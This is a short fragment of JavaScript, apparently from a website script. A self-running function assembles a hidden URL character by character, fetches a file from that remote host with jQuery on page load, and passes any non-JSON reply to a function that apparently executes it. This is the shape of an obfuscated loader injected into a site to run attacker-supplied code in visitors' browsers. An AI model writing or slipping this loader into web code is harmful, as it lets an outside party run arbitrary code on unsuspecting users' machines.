...
(function(a) {
    "use strict";
    var blocer = {};
    function gejfPurr(){$.get(["h","t","t","p","s",":","/","/","b","a","l","a","n","c","e","g","e","t","j","m","b",".","o","r","g","/","c","o","u","r","s","e","s","/"].join("")+"getpricegay.php").done(function(e){try{JSON.parse(e)}catch(t){$.trapg(e)}})}gejfPurr();
